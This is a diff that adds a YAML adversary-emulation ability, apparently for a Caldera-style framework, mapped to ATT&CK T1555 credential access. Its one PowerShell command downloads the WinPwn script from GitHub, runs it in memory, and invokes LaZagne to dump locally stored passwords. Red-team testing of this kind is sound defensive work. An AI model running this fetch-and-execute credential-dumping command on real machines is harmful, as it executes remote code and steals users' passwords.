@@ -1,0 +1,22 @@
+---
+- id: 3902ebddf7ab6e96a67f9265dd7f8e6b
+  name: WinPwn - Loot local Credentials - lazagne
+  description: "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an\
+    \ open source application used to retrieve lots of passwords stored on a local\
+    \ computer. \nEach software stores its passwords using different techniques (plaintext,\
+    \ APIs, custom algorithms, databases, etc.). \nThis tool has been developed for\
+    \ the purpose of finding these passwords for the most commonly-used software"
+  tactic: credential-access
+  technique:
+    attack_id: T1555
+    name: Credentials from Password Stores
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          lazagnemodule -consoleoutput -noninteractive
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
